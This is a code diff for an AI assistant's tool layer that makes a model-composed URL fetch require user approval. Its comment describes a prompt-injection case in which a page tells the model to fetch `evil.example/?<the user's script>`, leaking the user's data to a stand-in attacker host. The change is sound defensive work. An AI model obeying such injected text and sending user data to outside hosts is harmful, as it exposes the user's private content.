@@ -62,8 +62,17 @@ function annotationsOf(tool: AnyTool): Annotations {
     : {};
 }
 
-/** A write the user confirms before it runs: a delete. */
+/**
+ * A tool whose URL the model composes. A page in the thread could tell it
+ * to fetch `evil.example/?<the user's script>`, so the user sees the URL
+ * on a card before it goes out; a search query is short and shown too, but
+ * carries no page's data, so it does not ask.
+ */
+const URL_TOOLS = new Set(['openstory.fetch_url']);
+
+/** What the user confirms before it runs: a delete, or a fetch of a model-chosen URL. */
 export function needsApproval(tool: AnyTool): boolean {
+  if (URL_TOOLS.has(tool.name)) return true;
   const { readOnlyHint, destructiveHint } = annotationsOf(tool);
   return !readOnlyHint && destructiveHint === true;
 }
@@ -119,9 +128,4 @@ export function assistantTools(): AnyTool[] {
         unwrapMcpResult(await execute(input, ctx)),
     };
   });
-}
-
-/** A tool that changes nothing, by its own annotation. */
-export function isReadOnlyTool(tool: AnyTool): boolean {
-  return annotationsOf(tool).readOnlyHint === true;
 }
